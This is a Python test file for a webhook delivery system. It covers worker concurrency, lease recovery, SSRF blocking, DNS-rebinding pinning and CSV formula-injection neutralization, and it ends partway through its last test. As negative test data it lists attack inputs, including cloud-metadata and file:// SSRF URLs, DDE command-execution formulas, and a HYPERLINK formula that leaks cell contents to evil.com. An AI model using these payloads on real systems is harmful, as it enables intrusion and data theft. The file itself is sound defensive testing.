"""platform.integration concurrency, lease recovery, anti-SSRF and anti-CSV-injection tests.

ADR-013 / Week 13 Slice D.
Verifies:
1. Dual-worker FOR UPDATE SKIP LOCKED concurrency (no double claim/dispatch).
2. Worker crash recovery via lease expiry (lease_until < now).
3. Anti-SSRF validation and redirect safety matrix.
4. CSV formula injection neutralization edge cases.
"""

from __future__ import annotations

import asyncio
import socket
import uuid
from datetime import UTC, datetime, timedelta
from decimal import Decimal
from unittest.mock import patch

import httpx
import pytest
from sqlalchemy import insert
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker

from app.core import events
from app.platform.integration.batch import neutralize_formula, sanitize_row_for_csv
from app.platform.integration.models import WebhookDelivery, WebhookEndpoint
from app.platform.integration.ssrf import (
    SSRFValidationError,
    validate_webhook_url,
)
from app.platform.integration.worker import (
    claim_due_deliveries,
    dispatch_single_delivery,
)
from tests.platform.permissions._helpers import create_company

# ---------------------------------------------------------------------------
# 1. Concurrency: Dual-Worker SKIP LOCKED Verification
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_concurrent_workers_skip_locked_no_double_claim(
    db_session: AsyncSession,
) -> None:
    """Two concurrent workers claim from the same queue; no delivery is claimed twice."""
    co_id = await create_company(db_session, "CONC_CO")
    ep_id = uuid.uuid4()
    endpoint = WebhookEndpoint(
        id=ep_id,
        company_id=co_id,
        name="Concurrent Worker Endpoint",
        url="https://api.example.com/conc",
        signing_secret="whsec_123456789012345678901234567890123456789012345678",
        secret_prefix="whsec_123456",
        event_types=["*"],
        is_active=True,
    )
    db_session.add(endpoint)
    await db_session.flush()

    # Pre-seed 10 deliveries
    delivery_ids: list[uuid.UUID] = []
    for i in range(10):
        outbox_id = uuid.uuid4()
        await db_session.execute(
            insert(events.OUTBOX_TABLE).values(
                id=outbox_id,
                event_type="conc.test",
                payload={"company_id": str(co_id), "index": i},
            )
        )
        deliv = WebhookDelivery(
            company_id=co_id,
            endpoint_id=ep_id,
            outbox_event_id=outbox_id,
            event_type="conc.test",
            payload={"company_id": str(co_id), "index": i},
            status="PENDING",
            attempts=0,
            max_attempts=3,
        )
        db_session.add(deliv)
        delivery_ids.append(deliv.id)

    await db_session.commit()

    # Create two separate session instances connected to the same engine
    session_factory = async_sessionmaker(
        bind=db_session.bind,
        expire_on_commit=False,
    )

    async def _worker_claim(worker_num: int) -> list[uuid.UUID]:
        async with session_factory() as session:
            claimed = await claim_due_deliveries(session, batch_size=6)
            return [c.id for c in claimed]

    # Run two worker claims concurrently
    res_1, res_2 = await asyncio.gather(_worker_claim(1), _worker_claim(2))

    set_1 = set(res_1)
    set_2 = set(res_2)

    # Invariant: No delivery claimed by both workers
    assert set_1.isdisjoint(set_2), f"Overlap detected between workers: {set_1 & set_2}"
    assert len(set_1 | set_2) == 10, f"Expected 10 total claimed, got {len(set_1 | set_2)}"


# ---------------------------------------------------------------------------
# 2. Crash Recovery: Lease Expiry and Redelivery
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_crash_recovery_lease_expiry_and_redelivery(
    db_session: AsyncSession,
) -> None:
    """When a worker crashes leaving a delivery IN_PROGRESS,
    lease expiry allows another worker to reclaim it.
    """
    co_id = await create_company(db_session, "RECOVER_CO")
    ep_id = uuid.uuid4()
    endpoint = WebhookEndpoint(
        id=ep_id,
        company_id=co_id,
        name="Recovery Endpoint",
        url="https://api.example.com/recovery",
        signing_secret="whsec_123456789012345678901234567890123456789012345678",
        secret_prefix="whsec_123456",
        event_types=["*"],
        is_active=True,
    )
    db_session.add(endpoint)
    await db_session.flush()

    outbox_id = uuid.uuid4()
    await db_session.execute(
        insert(events.OUTBOX_TABLE).values(
            id=outbox_id,
            event_type="recover.event",
            payload={"company_id": str(co_id)},
        )
    )

    # Simulate crashed worker: status=IN_PROGRESS, lease_until expired 2 minutes ago
    crashed_delivery = WebhookDelivery(
        company_id=co_id,
        endpoint_id=ep_id,
        outbox_event_id=outbox_id,
        event_type="recover.event",
        payload={"company_id": str(co_id)},
        status="IN_PROGRESS",
        attempts=1,
        max_attempts=3,
        lease_until=datetime.now(UTC) - timedelta(minutes=2),
    )
    db_session.add(crashed_delivery)
    await db_session.commit()

    # New worker pass claims the stranded delivery
    claimed = await claim_due_deliveries(db_session)
    assert len(claimed) == 1
    assert claimed[0].id == crashed_delivery.id

    # Complete the delivery with 200 OK
    def _mock_handler_ok(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, text="Recovered OK")

    transport_ok = httpx.MockTransport(_mock_handler_ok)
    async with httpx.AsyncClient(transport=transport_ok) as mock_client:
        outcome = await dispatch_single_delivery(
            db_session,
            claimed[0],
            http_client=mock_client,
        )
        assert outcome == "DELIVERED"

    d_final = await db_session.get(WebhookDelivery, crashed_delivery.id)
    assert d_final is not None
    assert d_final.status == "DELIVERED"
    assert d_final.delivered_at is not None
    assert d_final.attempts == 2


# ---------------------------------------------------------------------------
# 3. Anti-SSRF & Redirect Protection Matrix
# ---------------------------------------------------------------------------


def test_anti_ssrf_validation_matrix() -> None:
    """Comprehensive SSRF prevention test suite covering all dangerous patterns."""
    # 1. Scheme checks: non-HTTP/HTTPS and insecure HTTP
    with pytest.raises(SSRFValidationError, match="Insecure HTTP scheme"):
        validate_webhook_url("http://partner.com/webhook")

    with pytest.raises(SSRFValidationError, match="Unsupported URL scheme"):
        validate_webhook_url("ftp://partner.com/webhook")

    with pytest.raises(SSRFValidationError, match="Unsupported URL scheme"):
        validate_webhook_url("file:///etc/passwd")

    with pytest.raises(SSRFValidationError, match="Unsupported URL scheme"):
        validate_webhook_url("gopher://127.0.0.1:70/")

    # 2. Blocked IP literals (loopback, private, cloud metadata, mapped IPv6)
    blocked_ips = [
        "https://127.0.0.1/webhook",
        "https://127.0.0.2:8443/webhook",
        "https://[::1]/webhook",
        "https://[::1]:8443/webhook",
        "https://0.0.0.0/webhook",
        # RFC 1918 Private IPs
        "https://10.0.0.1/webhook",
        "https://10.254.254.254/webhook",
        "https://172.16.0.1/webhook",
        "https://172.31.255.255/webhook",
        "https://192.168.1.1/webhook",
        "https://192.168.100.50/webhook",
        # Cloud metadata endpoints (AWS / GCP / Azure)
        "https://169.254.169.254/latest/meta-data/",
        "https://[fd00:ec2::254]/metadata",
        # IPv4-mapped IPv6 representations
        "https://[::ffff:127.0.0.1]/webhook",
        "https://[::ffff:169.254.169.254]/webhook",
        "https://[::ffff:10.0.0.1]/webhook",
    ]

    for url in blocked_ips:
        with pytest.raises(SSRFValidationError, match="restricted"):
            validate_webhook_url(url)

    # 3. Port boundary violations
    for bad_port in ["0", "65536", "70000"]:
        with pytest.raises(SSRFValidationError, match="Invalid port"):
            validate_webhook_url(f"https://example.com:{bad_port}/webhook")

    # 4. Hostname resolution to private IP (simulated DNS rebinding)
    fake_private_addr = [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("192.168.1.100", 443))]
    with (
        patch("socket.getaddrinfo", return_value=fake_private_addr),
        pytest.raises(SSRFValidationError, match="resolves to restricted IP"),
    ):
        validate_webhook_url("https://rebinding.attacker.com/webhook")

    # 5. Hostname resolution to valid public IP
    fake_public_addr = [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))]
    with patch("socket.getaddrinfo", return_value=fake_public_addr):
        cleaned = validate_webhook_url("https://api.partner.com/webhook")
        assert cleaned == "https://api.partner.com/webhook"


@pytest.mark.asyncio
async def test_webhook_redirect_prevention(
    db_session: AsyncSession,
) -> None:
    """HTTP client does not follow redirects to protect against SSRF bounce attacks."""
    co_id = await create_company(db_session, "REDIRECT_CO")
    ep_id = uuid.uuid4()
    endpoint = WebhookEndpoint(
        id=ep_id,
        company_id=co_id,
        name="Redirect Hook",
        url="https://api.partner.com/redirect",
        signing_secret="whsec_123456789012345678901234567890123456789012345678",
        secret_prefix="whsec_123456",
        event_types=["*"],
        is_active=True,
    )
    db_session.add(endpoint)
    await db_session.flush()

    outbox_id = uuid.uuid4()
    await db_session.execute(
        insert(events.OUTBOX_TABLE).values(
            id=outbox_id,
            event_type="test.event",
            payload={"company_id": str(co_id)},
        )
    )

    delivery = WebhookDelivery(
        company_id=co_id,
        endpoint_id=ep_id,
        outbox_event_id=outbox_id,
        event_type="test.event",
        payload={"company_id": str(co_id)},
        status="PENDING",
        attempts=0,
        max_attempts=3,
    )
    db_session.add(delivery)
    await db_session.commit()

    claimed = await claim_due_deliveries(db_session)
    assert len(claimed) == 1

    # Simulate server returning a 302 redirecting to internal AWS metadata service
    def _mock_handler_redirect(request: httpx.Request) -> httpx.Response:
        return httpx.Response(
            302,
            headers={"Location": "http://169.254.169.254/latest/meta-data/"},
            text="Redirecting to internal metadata",
        )

    transport_redirect = httpx.MockTransport(_mock_handler_redirect)
    async with httpx.AsyncClient(
        transport=transport_redirect, follow_redirects=False
    ) as mock_client:
        outcome = await dispatch_single_delivery(
            db_session,
            claimed[0],
            http_client=mock_client,
        )
        # Outcome is PENDING retry because 302 is not 2xx, and redirect was NOT followed
        assert outcome == "PENDING"

    d_refreshed = await db_session.get(WebhookDelivery, delivery.id)
    assert d_refreshed is not None
    assert d_refreshed.last_http_status == 302
    assert d_refreshed.status == "PENDING"


# ---------------------------------------------------------------------------
# 4. CSV Formula Injection Defense Matrix
# ---------------------------------------------------------------------------


def test_csv_formula_injection_defense_matrix() -> None:
    """Test all dangerous formula injection characters and bypass attempts."""
    # Malicious injection payloads must be neutralized with a leading apostrophe
    dangerous_inputs = [
        "=cmd|' /C calc'!A0",
        "@SUM(1+1)*cmd|' /C calc'!A0",
        "+cmd|' /C calc'!A0",
        "-cmd|' /C calc'!A0",
        "\t=cmd|' /C calc'!A0",
        "\r=cmd|' /C calc'!A0",
        "  =cmd|' /C calc'!A0",
        "  +cmd|' /C calc'!A0",
        "=HYPERLINK('http://evil.com?leak='&A1, 'Error')",
        "@HYPERLINK('http://evil.com?leak='&A1, 'Error')",
    ]

    for payload in dangerous_inputs:
        neutralized = neutralize_formula(payload)
        assert isinstance(neutralized, str)
        assert neutralized.startswith("'"), f"Failed to neutralize: {payload!r} -> {neutralized!r}"

    # Safe numeric values must NOT have an apostrophe prepended
    safe_numerics = [
        "-10.50",
        "-100",
        "+50",
        "+0.00",
        "100.00",
        "-0.5",
    ]

    for num in safe_numerics:
        result = neutralize_formula(num)
        assert result == num, f"Safe numeric was incorrectly modified: {num!r} -> {result!r}"

    # Plain text and benign values must remain untouched
    benign_values = [
        "Normal Customer Name",
        "Product SKU-12345",
        "user@example.com",
        "123 Main Street, Suite 400",
        "",
        None,
        12345,
        Decimal("99.99"),
    ]

    for val in benign_values:
        result = neutralize_formula(val)
        assert result == val

    # Test dictionary row sanitization
    sample_row = {
        "name": "=cmd|' /C calc'!A0",
        "price": "-45.00",
        "email": "user@example.com",
    }
    sanitized = sanitize_row_for_csv(sample_row)
    assert sanitized["name"] == "'=cmd|' /C calc'!A0"
    assert sanitized["price"] == "-45.00"
    assert sanitized["email"] == "user@example.com"


# ---------------------------------------------------------------------------
# 5. Red-Team Findings Verification (VULN-01, VULN-02, VULN-08, VULN-09)
# ---------------------------------------------------------------------------


def test_ssrf_cgnat_and_alibaba_metadata_blocked() -> None:
    """Verify VULN-02: Alibaba IMDS and CGNAT IP ranges are rejected."""
    blocked_new_targets = [
        "https://100.100.100.200/latest/meta-data/",
        "https://100.64.0.1/webhook",
        "https://100.127.255.254/webhook",
        "https://198.18.0.1/webhook",
        "https://198.19.255.254/webhook",
    ]
    for url in blocked_new_targets:
        with pytest.raises(SSRFValidationError, match="restricted"):
            validate_webhook_url(url)


@pytest.mark.asyncio
async def test_dispatch_ssrf_revalidation_dns_rebinding_defense(
    db_session: AsyncSession,
) -> None:
    """Verify VULN-01: When DNS rebinds to an internal IP at dispatch time,
    the delivery is marked DEAD immediately.
    """
    co_id = await create_company(db_session, "REBIND_CO")
    ep_id = uuid.uuid4()
    endpoint = WebhookEndpoint(
        id=ep_id,
        company_id=co_id,
        name="Rebinding Hook",
        url="https://rebinding.attacker.com/webhook",
        signing_secret="whsec_123456789012345678901234567890123456789012345678",
        secret_prefix="whsec_123456",
        event_types=["*"],
        is_active=True,
    )
    db_session.add(endpoint)
    await db_session.flush()

    outbox_id = uuid.uuid4()
    await db_session.execute(
        insert(events.OUTBOX_TABLE).values(
            id=outbox_id,
            event_type="test.event",
            payload={"company_id": str(co_id)},
        )
    )

    delivery = WebhookDelivery(
        company_id=co_id,
        endpoint_id=ep_id,
        outbox_event_id=outbox_id,
        event_type="test.event",
        payload={"company_id": str(co_id)},
        status="PENDING",
        attempts=0,
        max_attempts=3,
    )
    db_session.add(delivery)
    await db_session.commit()

    claimed = await claim_due_deliveries(db_session)
    assert len(claimed) == 1

    # Simulate DNS rebinding: getaddrinfo resolves to 169.254.169.254 during dispatch
    fake_rebound_addr = [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("169.254.169.254", 443))]
    with patch("socket.getaddrinfo", return_value=fake_rebound_addr):
        outcome = await dispatch_single_delivery(
            db_session,
            claimed[0],
            http_client=None,
        )
        assert outcome == "DEAD"

    d_refreshed = await db_session.get(WebhookDelivery, delivery.id)
    assert d_refreshed is not None
    assert d_refreshed.status == "DEAD"
    assert "SSRF re-validation failed at dispatch" in (d_refreshed.last_error or "")


def test_multi_signature_header_verification() -> None:
    """Verify VULN-09: multi-signature headers (used during key rotation) are supported."""
    from app.platform.integration.signing import sign_webhook_payload, verify_webhook_signature

    payload = b'{"event":"test"}'
    old_secret = "whsec_old0000000000000000000000000000000000000000000000"
    current_secret = "whsec_cur0000000000000000000000000000000000000000000000"

    # Generate signature for both secrets with same timestamp
    ts = 1700000000
    sig_old, _ = sign_webhook_payload(payload, old_secret, timestamp=ts)
    sig_cur, _ = sign_webhook_payload(payload, current_secret, timestamp=ts)

    # Extract raw v1 parts
    v1_old = next(p.split("=")[1] for p in sig_old.split(",") if p.startswith("v1="))
    v1_cur = next(p.split("=")[1] for p in sig_cur.split(",") if p.startswith("v1="))

    # Combined header during rotation
    combined_header = f"t={ts},v1={v1_old},v1={v1_cur}"

    # Verifying against either secret must succeed
    assert verify_webhook_signature(payload, old_secret, combined_header, current_time=ts) is True
    assert (
        verify_webhook_signature(payload, current_secret, combined_header, current_time=ts) is True
    )

    # Bad secret must still fail
    assert (
        verify_webhook_signature(
            payload,
            "whsec_invalid00000000000000000000000000000000000000000000",
            combined_header,
            current_time=ts,
        )
        is False
    )


def test_formula_injection_advanced_bypasses() -> None:
    """Verify VULN-08: tabs, invisible chars, and quote wrap bypasses are neutralized."""
    bypasses = [
        "\t+123",
        "\t-456",
        "\r+123",
        "\n=cmd",
        '"=cmd|calc"',
        "'=cmd|calc'",
        "   =SUM(A1:A10)",
        "   +SUM(A1:A10)",
    ]
    for b in bypasses:
        neutralized = neutralize_formula(b)
        assert neutralized.startswith("'"), f"Failed to neutralize: {b!r} -> {neutralized!r}"

    # True clean numbers remain numbers
    assert neutralize_formula("+100") == "+100"
    assert neutralize_formula("-50.25") == "-50.25"
    assert neutralize_formula("0.00") == "0.00"


@pytest.mark.asyncio
async def test_pinned_ip_network_backend_closes_dns_rebinding_and_no_second_dns(
    db_session: AsyncSession,
) -> None:
    """Verify DNS resolves once before transport creation and connects directly to pinned IP."""
    import httpcore

    from app.platform.integration.ssrf import PinnedDestination
    from app.platform.integration.worker import _perform_http_dispatch, _PinnedIPNetworkBackend

    # 1. Host mismatch on pinned backend fails closed.
    backend = _PinnedIPNetworkBackend("api.example.com", 443, ("93.184.216.34",))
    with pytest.raises(httpcore.ConnectError, match="Blocked unexpected outbound connection"):
        await backend.connect_tcp("127.0.0.1", 443)

    # 2. Live dispatch resolves DNS once and dials the pinned IP instead of re-resolving hostname.
    co_id = await create_company(db_session, "PIN_CO")
    ep = WebhookEndpoint(
        company_id=co_id,
        name="Pinned Hook",
        url="https://pinned.example.com/hook",
        signing_secret="whsec_123456789012345678901234567890123456789012345678",
        secret_prefix="whsec_123456",
        event_types=["*"],
        is_active=True,
    )
    db_session.add(ep)
    await db_session.flush()

    outbox_id = uuid.uuid4()
    await db_session.execute(
        insert(events.OUTBOX_TABLE).values(
            id=outbox_id,
            event_type="pin.test",
            payload={"company_id": str(co_id)},
        )
    )
    deliv = WebhookDelivery(
        company_id=co_id,
        endpoint_id=ep.id,
        outbox_event_id=outbox_id,
        event_type="pin.test",
        payload={"ok": True},
        status="PENDING",
        attempts=0,
        max_attempts=3,
    )
    db_session.add(deliv)
    await db_session.commit()

    claimed = await claim_due_deliveries(db_session)
    assert len(claimed) == 1

    dialed_targets: list[tuple[str, int]] = []
    dns_calls = 0

    def _dns_once(*_args: object, **_kwargs: object) -> list[tuple[object, ...]]:
        nonlocal dns_calls
        dns_calls += 1
        if dns_calls == 1:
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))]
        raise AssertionError("Secondary DNS resolution must not occur after pinning")

    async def _fake_connect_tcp(
        _self: httpcore.AnyIOBackend,
        host: str,
        port: int,
        **_kwargs: object,
    ) -> httpcore.AsyncNetworkStream:
        dialed_targets.append((host, port))
        raise httpcore.ConnectTimeout("simulated connect to verify dialed target")

    with (
        patch("socket.getaddrinfo", side_effect=_dns_once),
        patch.object(httpcore.AnyIOBackend, "connect_tcp", _fake_connect_tcp),
    ):
        outcome = await dispatch_single_delivery(db_session, claimed[0], http_client=None)
        assert outcome == "PENDING"

    assert dns_calls == 1
    assert dialed_targets == [("93.184.216.34", 443)]

    # Direct _perform_http_dispatch uses provided PinnedDestination without another DNS lookup.
    dest = PinnedDestination(
        clean_url="https://pinned.example.com/hook",
        scheme="https",
        hostname="pinned.example.com",
        port=443,
        resolved_ips=("93.184.216.34",),
    )
    with (
        patch(
            "socket.getaddrinfo", side_effect=AssertionError("No DNS inside _perform_http_dispatch")
        ),
        patch.object(httpcore.AnyIOBackend, "connect_tcp", _fake_connect_tcp),
    ):
        ok, status_code, err = await _perform_http_dispatch(dest, b"{}", {}, 2.0, http_client=None)
        assert ok is False
        assert status_code is None
        assert "ConnectTimeout" in (err or "")


@pytest.mark.asyncio
async def test_decompression_bomb_and_slowloris_timeout_protection() -> None:
    """Verify Accept-Encoding: identity, bounded raw stream cap, and asyncio.timeout."""
    import gzip

    from app.platform.integration.ssrf import PinnedDestination
    from app.platform.integration.worker import _perform_http_dispatch

    dest = PinnedDestination(
        clean_url="https://api.example.com/hook",
        scheme="https",
        hostname="api.example.com",
        port=443,
        resolved_ips=("93.184.216.34",),
    )

    seen_accept_encoding: list[str | None] = []
    bomb_bytes = gzip.compress(b"A" * (512 * 1024))
    oversized_raw_stream = bomb_bytes + (b"B" * 1024)

    def _bomb_handler(request: httpx.Request) -> httpx.Response:
        seen_accept_encoding.append(request.headers.get("accept-encoding"))
        return httpx.Response(
            200,
            headers={"Content-Encoding": "gzip"},
            stream=httpx.ByteStream(oversized_raw_stream),
        )

    async with httpx.AsyncClient(transport=httpx.MockTransport(_bomb_handler)) as client:
        ok, status_code, err = await _perform_http_dispatch(
            dest,
            b"{}",
            {},
            2.0,
            max_response_bytes=128,
            http_client=client,
        )
    assert seen_accept_encoding == ["identity"]
    assert ok is False
    assert status_code == 200
    assert "exceeded max allowed size of 128 bytes" in (err or "")

    # Slow-Loris handler stalling past asyncio.timeout(timeout_sec + 1.0) aborts cleanly.
    async def _slow_handler(_request: httpx.Request) -> httpx.Response:
        await asyncio.sleep(5.0)
        return httpx.Response(200, text="too late")

    async with httpx.AsyncClient(transport=httpx.MockTransport(_slow_handler)) as slow_client:
        ok, status_code, err = await _perform_http_dispatch(
            dest,
            b"{}",
            {},
            timeout_sec=0.05,
            http_client=slow_client,
        )
    assert ok is False
    assert status_code is None
    assert "Timeout" in (err or "")


@pytest.mark.asyncio
async def test_outbox_fanout_poison_pill_and_dual_worker_skip_locked(
    db_session: AsyncSession,
) -> None:
    """Verify malformed outbox JSONB does not crash batch and two workers avoid conflicts."""
    from app.platform.integration.worker import fan_out_outbox_events

    co_id = await create_company(db_session, "FANOUT_CO")
    ep = WebhookEndpoint(
        company_id=co_id,
        name="Fanout Target",
        url="https://api.example.com/fanout",
        signing_secret="whsec_123456789012345678901234567890123456789012345678",
        secret_prefix="whsec_123456",
        event_types=["*"],
        is_active=True,
    )
    db_session.add(ep)
    await db_session.flush()

    # Poison-pill non-dict JSONB string + 4 valid outbox events
    rows = [
        {"id": uuid.uuid4(), "event_type": "poison.event", "payload": "not_an_object"},
    ] + [
        {"id": uuid.uuid4(), "event_type": "valid.event", "payload": {"company_id": str(co_id)}}
        for _ in range(4)
    ]
    await db_session.execute(insert(events.OUTBOX_TABLE), rows)
    await db_session.commit()

    session_factory = async_sessionmaker(db_session.bind, expire_on_commit=False)

    async def _run_fanout() -> tuple[int, int]:
        async with session_factory() as s:
            return await fan_out_outbox_events(s, batch_size=10)

    r1, r2 = await asyncio.gather(_run_fanout(), _run_fanout())
    assert r1[0] + r2[0] == 5
    assert r1[1] + r2[1] == 4


@pytest.mark.asyncio
async def test_cross_tenant_fair_claim_round_robin(
    db_session: AsyncSession,
) -> None:
    """Noisy Tenant A with older queued events must not starve Tenant B."""
    co_a = await create_company(db_session, "FAIR_A")
    co_b = await create_company(db_session, "FAIR_B")

    ep_a = WebhookEndpoint(
        company_id=co_a,
        name="Tenant A Hook",
        url="https://api.example.com/a",
        signing_secret="whsec_123456789012345678901234567890123456789012345678",
        secret_prefix="whsec_123456",
        event_types=["*"],
        is_active=True,
    )
    ep_b = WebhookEndpoint(
        company_id=co_b,
        name="Tenant B Hook",
        url="https://api.example.com/b",
        signing_secret="whsec_123456789012345678901234567890123456789012345678",
        secret_prefix="whsec_123456",
        event_types=["*"],
        is_active=True,
    )
    db_session.add_all([ep_a, ep_b])
    await db_session.flush()

    now = datetime.now(UTC)
    for i in range(5):
        ob_id = uuid.uuid4()
        await db_session.execute(
            insert(events.OUTBOX_TABLE).values(
                id=ob_id,
                event_type="fair.a",
                payload={"company_id": str(co_a)},
            )
        )
        db_session.add(
            WebhookDelivery(
                company_id=co_a,
                endpoint_id=ep_a.id,
                outbox_event_id=ob_id,
                event_type="fair.a",
                payload={"i": i},
                status="PENDING",
                next_attempt_at=now - timedelta(minutes=10 - i),
            )
        )

    for i in range(2):
        ob_id = uuid.uuid4()
        await db_session.execute(
            insert(events.OUTBOX_TABLE).values(
                id=ob_id,
                event_type="fair.b",
                payload={"company_id": str(co_b)},
            )
        )
        db_session.add(
            WebhookDelivery(
                company_id=co_b,
                endpoint_id=ep_b.id,
                outbox_event_id=ob_id,
                event_type="fair.b",
                payload={"i": i},
                status="PENDING",
                next_attempt_at=now - timedelta(seconds=30 - i),
            )
        )
    await db_session.commit()

    claimed = await claim_due_deliveries(db_session, batch_size=4)
    assert len(claimed) == 4
    first_two_tenants = {c.company_id for c in claimed[:2]}
    assert first_two_tenants == {co_a, co_b}
    claimed_b = [c for c in claimed if c.company_id == co_b]
    assert len(claimed_b) == 2


@pytest.mark.asyncio
async def test_dual_secret_emission_error_truncation_and_batch_resilience(
    db_session: AsyncSession,
) -> None:
    """Verify dual-secret dispatch headers, error truncation <=1000 chars, and batch cap."""
    from app.platform.integration.signing import verify_webhook_signature
    from app.platform.integration.worker import process_outbox_batch

    co_id = await create_company(db_session, "DUAL_EMIT_CO")
    cur_secret = "whsec_cur1234567890123456789012345678901234567890123456"
    prev_secret = "whsec_prv1234567890123456789012345678901234567890123456"
    ep = WebhookEndpoint(
        company_id=co_id,
        name="Dual Secret Hook",
        url="https://93.184.216.34/dual",
        signing_secret=cur_secret,
        previous_signing_secret=prev_secret,
        previous_secret_expires_at=datetime.now(UTC) + timedelta(minutes=5),
        secret_prefix=cur_secret[:12],
        event_types=["*"],
        is_active=True,
    )
    db_session.add(ep)
    await db_session.flush()

    deliv_ids: list[uuid.UUID] = []
    for i in range(3):
        ob_id = uuid.uuid4()
        await db_session.execute(
            insert(events.OUTBOX_TABLE).values(
                id=ob_id,
                event_type=f"dual.evt.{i}",
                payload={"company_id": str(co_id), "seq": i},
            )
        )
        d = WebhookDelivery(
            company_id=co_id,
            endpoint_id=ep.id,
            outbox_event_id=ob_id,
            event_type=f"dual.evt.{i}",
            payload={"seq": i},
            status="PENDING",
            attempts=0,
            max_attempts=3,
        )
        db_session.add(d)
        await db_session.flush()
        deliv_ids.append(d.id)
    await db_session.commit()

    captured_headers: list[tuple[dict[str, str], bytes]] = []

    def _dual_handler(request: httpx.Request) -> httpx.Response:
        if len(captured_headers) == 0:
            captured_headers.append((dict(request.headers), request.content))
            return httpx.Response(200, text="OK")
        # Return huge error body (> 1000 bytes) on subsequent calls
        return httpx.Response(500, text="E" * 2500)

    session_factory = async_sessionmaker(db_session.bind, expire_on_commit=False)
    async with httpx.AsyncClient(transport=httpx.MockTransport(_dual_handler)) as client:
        # max_concurrency=2 caps claim size below 3 queued deliveries
        summary = await process_outbox_batch(
            session_factory,
            http_client=client,
            delivery_batch_size=10,
            max_concurrency=2,
        )
        assert summary.delivered == 1
        assert summary.retried == 1

    req_headers, req_body = captured_headers[0]
    sig_header = req_headers["x-webhook-signature"]
    assert "x-webhook-timestamp" in req_headers
    assert req_headers["x-webhook-event"].startswith("dual.evt.")
    assert verify_webhook_signature(req_body, cur_secret, sig_header)
    assert verify_webhook_signature(req_body, prev_secret, sig_header)

    # Check failed row error length truncation (<= 1000) and third row still untouched PENDING
    db_session.expire_all()
    d2 = await db_session.get(WebhookDelivery, deliv_ids[1])
    d3 = await db_session.get(WebhookDelivery, deliv_ids[2])
    assert d2 is not None and d2.last_error is not None
    assert len(d2.last_error) <= 1000
    assert d3 is not None and d3.status == "PENDING"


@pytest.mark.asyncio
async def test_idn_pinning_and_transient_dns_retry_behavior(
    db_session: AsyncSession,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Verify IDN Punycode pinning works end-to-end and transient DNS errors retry."""
    import httpcore

    from app.platform.integration.ssrf import (
        SSRFValidationError,
        resolve_and_pin_webhook_url,
    )
    from app.platform.integration.worker import ClaimedDelivery, _perform_http_dispatch

    # 1. Invalid IDNA domain rejected cleanly
    with pytest.raises(SSRFValidationError, match="Invalid webhook hostname"):
        resolve_and_pin_webhook_url("https://invalid..example/hook")

    # 2. IDN hostname normalizes to Punycode ASCII matching httpcore's target host
    def _idn_dns(
        host: str,
        *_args: object,
        **_kwargs: object,
    ) -> list[tuple[object, ...]]:
        assert host == "xn--r8jz45g.jp"
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))]

    monkeypatch.setattr(socket, "getaddrinfo", _idn_dns)
    dest = resolve_and_pin_webhook_url("https://例え.jp/hook")
    assert dest.hostname == "xn--r8jz45g.jp"
    assert dest.resolved_ips == ("93.184.216.34",)

    dialed_targets: list[tuple[str, int]] = []

    async def _fake_connect_tcp_pinned(
        _self: httpcore.AnyIOBackend,
        host: str,
        port: int,
        **_kwargs: object,
    ) -> httpcore.AsyncNetworkStream:
        dialed_targets.append((host, port))
        raise httpcore.ConnectTimeout("simulated connect after IDN/IPv6 pin acceptance")

    monkeypatch.setattr(httpcore.AnyIOBackend, "connect_tcp", _fake_connect_tcp_pinned)
    ok_idn, _, err_idn = await _perform_http_dispatch(dest, b"{}", {}, 2.0, http_client=None)
    assert ok_idn is False
    assert "ConnectTimeout" in (err_idn or "")
    assert dialed_targets == [("93.184.216.34", 443)]

    # Uppercase hex IPv6 literal also passes httpcore's host check cleanly
    ipv6_dest = resolve_and_pin_webhook_url("https://[2606:4700:4700::ABCD]/hook")
    ok_v6, _, err_v6 = await _perform_http_dispatch(ipv6_dest, b"{}", {}, 2.0, http_client=None)
    assert ok_v6 is False
    assert "ConnectTimeout" in (err_v6 or "")
    assert dialed_targets == [("93.184.216.34", 443), ("2606:4700:4700::abcd", 443)]

    # 3. Worker treats transient socket.gaierror as retryable PENDING (not DEAD),
    # while permanent blocked IP transitions straight to DEAD.
    co_id = await create_company(db_session, "DNS_RETRY_CO")
    ep = WebhookEndpoint(
        company_id=co_id,
        name="DNS Retry Hook",
        url="https://api.example.org/hook",
        signing_secret="whsec_123456789012345678901234567890123456789012345678",
        secret_prefix="whsec_123456",
        event_types=["*"],
        is_active=True,
    )
    db_session.add(ep)
    await db_session.flush()

    def _make_delivery_and_claim() -> tuple[uuid.UUID, ClaimedDelivery]:
        return uuid.uuid4(), ClaimedDelivery(
            id=uuid.uuid4(),
            company_id=co_id,
            endpoint_id=ep.id,
            payload={"x": 1},
            attempts=0,
            max_attempts=3,
            event_type="dns.test",
        )

    ob1, claim1 = _make_delivery_and_claim()
    ob2, claim2 = _make_delivery_and_claim()
    for ob_id, claim in ((ob1, claim1), (ob2, claim2)):
        await db_session.execute(
            insert(events.OUTBOX_TABLE).values(
                id=ob_id,
                event_type="dns.test",
                payload={"company_id": str(co_id)},
            )
        )
        db_session.add(
            WebhookDelivery(
                id=claim.id,
                company_id=co_id,
                endpoint_id=ep.id,
                outbox_event_id=ob_id,
                event_type="dns.test",
                payload=claim.payload,
                status="IN_PROGRESS",
                attempts=0,
                max_attempts=3,
            )
        )
    await db_session.commit()

    def _raise_gaierror(*_args: object, **_kwargs: object) -> list[tuple[object, ...]]:
        raise socket.gaierror(socket.EAI_AGAIN, "Temporary failure in name resolution")

    monkeypatch.setattr(socket, "getaddrinfo", _raise_gaierror)
    status1 = await dispatch_single_delivery(db_session, claim1)
    assert status1 == "PENDING"
    d1 = await db_session.get(WebhookDelivery, claim1.id)
    assert d1 is not None
    assert d1.attempts == 1
    assert d1.next_attempt_at > datetime.now(UTC)

    def _return_loopback(*_args: object, **_kwargs: object) -> list[tuple[object, ...]]:
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", 443))]

